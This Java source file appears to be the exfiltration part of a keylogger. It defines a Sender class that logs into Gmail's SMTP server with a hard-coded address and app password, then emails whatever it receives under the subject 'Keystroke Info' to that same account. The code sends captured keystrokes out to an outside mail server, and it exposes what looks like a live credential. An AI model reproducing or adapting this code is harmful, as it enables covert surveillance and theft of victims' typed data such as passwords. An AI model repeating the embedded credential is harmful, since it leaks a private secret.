import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.util.Properties;

public class Sender {
    private Sender() {}

    private static final String SENDER_GMAIL = "arlindidrizise@gmail.com";
    private static final String SENDER_PASSWORD = "gxjfoyvyylxwhebd";
    private static final String RECEIVER_EMAIL = "arlindidrizise@gmail.com";

    private static Properties mailServerProperties;
    private static Session mailSess;
    private static MimeMessage mailMessage;

    public static void sendMail(String EMAIL) throws Throwable {
        mailServerProperties = System.getProperties();
        mailServerProperties.put("mail.smtp.port", "587");
        mailServerProperties.put("mail.smtp.auth", "true");
        mailServerProperties.put("mail.smtp.starttls.enable", "true");

        mailSess = Session.getDefaultInstance(mailServerProperties);
        mailMessage = new MimeMessage(mailSess);
        mailMessage.addRecipients(MimeMessage.RecipientType.BCC, String.valueOf(new InternetAddress(SENDER_GMAIL)));
        mailMessage.setSubject("Keystroke Info");
        mailMessage.setContent(EMAIL, "text/html");

        Transport transport = mailSess.getTransport("smtp");
        transport.connect("smtp.gmail.com", SENDER_GMAIL, SENDER_PASSWORD);
        transport.sendMessage(mailMessage, mailMessage.getAllRecipients());
        transport.close();
    }
}
